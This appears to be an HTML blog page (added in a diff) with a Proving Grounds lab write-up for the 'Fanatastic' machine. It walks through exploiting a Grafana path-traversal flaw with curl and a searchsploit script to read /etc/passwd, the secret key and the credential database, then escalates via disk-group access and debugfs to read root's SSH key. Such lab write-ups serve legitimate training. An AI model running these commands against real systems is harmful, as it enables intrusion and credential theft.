@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
+    <meta name="description" content="" />
+    <meta name="author" content="" />
+    <title>Matthew Castro - Blog</title>
+    <link rel="icon" type="image/x-icon" href="../../assets/favicon.ico" />
+    <!-- Font Awesome icons (free version)-->
+    <script src="https://use.fontawesome.com/releases/v6.3.0/js/all.js" crossorigin="anonymous"></script>
+    <!-- Google fonts-->
+    <link href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet"
+        type="text/css" />
+    <link
+        href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800"
+        rel="stylesheet" type="text/css" />
+    <!-- Core theme CSS (includes Bootstrap)-->
+    <link href="../../css/styles.css" rel="stylesheet" />
+    <link rel="preload" as="image" href="/assets/img/backgroud.jpg">
+    <link rel="preload" as="image" href="/assets/img/posts.jpg">
+</head>
+
+<body>
+    <!-- Navigation-->
+    <nav class="navbar navbar-expand-lg navbar-light" id="mainNav">
+        <div class="container px-4 px-lg-5">
+            <a class="navbar-brand" href="../../index.html">Matthew Castro</a>
+            <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarResponsive"
+                aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
+                Menu
+                <i class="fas fa-bars"></i>
+            </button>
+            <div class="collapse navbar-collapse" id="navbarResponsive">
+                <ul class="navbar-nav ms-auto py-4 py-lg-0">
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../index.html">Homelab</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../reports.html">Reports</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../Write-ups.html">Write-ups</a></li>
+                        <li class="nav-item"><a class="nav-link px-lg-3 py-3 py-lg-4" href="../../about.html">About</a></li>
+                </ul>
+            </div>
+        </div>
+    </nav>
+    <!-- Page Header-->
+    <header class="masthead" style="background-image: url('../../assets/img/posts.jpg')">
+        <div class="container position-relative px-4 px-lg-5">
+            <div class="row gx-4 gx-lg-5 justify-content-center">
+                <div class="col-md-10 col-lg-8 col-xl-7">
+                    <div class="post-heading">
+                        <h2>Fanatastic - Proving Grounds Write-up</h2>
+                        <span class="meta">
+                            Posted on January 27th, 2026
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <!-- Post Content-->
+    <article class="mb-4">
+        <div class="container px-4 px-lg-5">
+            <div class="row gx-4 gx-lg-5 justify-content-center">
+                <div class="col-md-10 col-lg-8 col-xl-7">
+                    <p>We start by finding the service version for Grafana in the "Reset password" section of the website.
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/fanatastic/1.png" alt="..." />
+                        <p></p>
+                        We then find a LFI vulnerability with searchsploit:                           
+                        <p></p>
+                        <span class="grey-line">searchsploit grafana</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/fanatastic/2.png" alt="..." />
+                        <p></p>
+                    </p>
+                    <p>
+                       We test it out by reading the /etc/passwd file.
+                    </p>
+                        <p></p>
+                        <span class="grey-line">searchsploit -m 50581</span>
+                        <p></p>
+                        <span class="grey-line">python3 50581.py -H http://192.168.177.181:3000</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/fanatastic/3.png" alt="..." />
+                        <p></p>
+                        We take note of the user "sysadmin".                        
+                        <p></p>
+                        After a little bit of digging, we discover that Grafana stores its credentials in a SQLite3 database file at /var/lib/grafana/grafana.db. 
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/fanatastic/3.5.png" alt="..." />
+                        <p></p>                    
+                        <img class="img-fluid" src="../../assets/img/writeups/fanatastic/3.6.png" alt="..." />
+                        <p></p>   
+                        After reading this post: <a href="https://nusgreyhats.org/posts/writeups/a-not-so-deep-dive-in-to-grafana-cve-2021-43798/" target="_blank"><u>https://nusgreyhats.org/posts/writeups/a-not-so-deep-dive-in-to-grafana-cve-2021-43798/</u></a>
+                         we learn that the password stored in the grafana.db
+                         file can be decrypted with a key located in /etc/grafana/grafana.ini. We extract both the password and the key from each respective file.   
+                        <p></p>
+                        <span class="grey-line">curl "http://192.168.177.181:3000/public/plugins/text/../../../../../../../../../etc/grafana/grafana.ini" -s --path-as-is --output - | grep secret_key</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/fanatastic/4.png" alt="..." />
+                        <p></p>
+                        <span class="grey-line"> curl "http://192.168.177.181:3000/public/plugins/text/../../../../../../../../../var/lib/grafana/grafana.db" -s --path-as-is --output - | grep -a basicAuth</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/fanatastic/5.png" alt="..." />
+                        <p></p>
+                        We then decrypt the password using a function from the Grafana source code. We first copy the grafana/pkg/util/encryption.go file from its GitHub repository to our machine,
+                         remove the encrypt function and its imports, and create a new main function. 
+                        <p></p>
+                        Our created function calls the decrypt function that was originally included in the file and decrypts the password. 
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/fanatastic/5.6.png" alt="..." />
+                        <p></p>
+                        <span class="grey-line">go run test1.go</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/fanatastic/5.5.png" alt="..." />
+                        <p></p>
+                        We can now use the decrypted password to SSH into the machine as user sysadmin. 
+                        <p></p>
+                        <span class="grey-line">ssh sysadmin@192.168.177.181</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/fanatastic/6.png" alt="..." />
+                        <p></p>
+                        We quickly notice that we are part of the disk group.                         
+                        <p></p>
+                        <span class="grey-line">whoami</span>
+                        <p></p>
+                        <span class="grey-line">groups</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/fanatastic/7.png" alt="..." />
+                        <p></p>
+                        The permissions assigned to users in this group allow us to read any file by accessing the filesystem directly, bypassing any file permissions or restrictions.
+                        <p></p>
+                        We start by locating the main partition:
+                        <p></p>
+                        <span class="grey-line">df -h</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/fanatastic/8.png" alt="..." />
+                        <p></p>
+                        We then use the debugfs command to read the SSH key of the root user.
+                        <p></p>
+                        <span class="grey-line">debugfs /dev/sda2</span>
+                        <p></p>
+                        <span class="grey-line">cat /root/.ssh/id_rsa</span>
+                        <p></p>
+                        <img class="img-fluid" src="../../assets/img/writeups/fanatastic/9.png" alt="..." />
+                        <p></p>
+                        We use the key to connect to the machine via SSH as root.
+                        <p></p>
+                        <span class="grey-line">ssh root@192.168.177.181 -i test</span>
+                        <p></p>
+                         <img class="img-fluid" src="../../assets/img/writeups/fanatastic/10.png" alt="..." />
+
+
+
+                </div>
+            </div>
+        </div>
+    </article>
+    <!-- Bootstrap core JS-->
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/js/bootstrap.bundle.min.js"></script>
+    <!-- Core theme JS-->
+    <script src="js/scripts.js"></script>
+</body>
+
+</html>
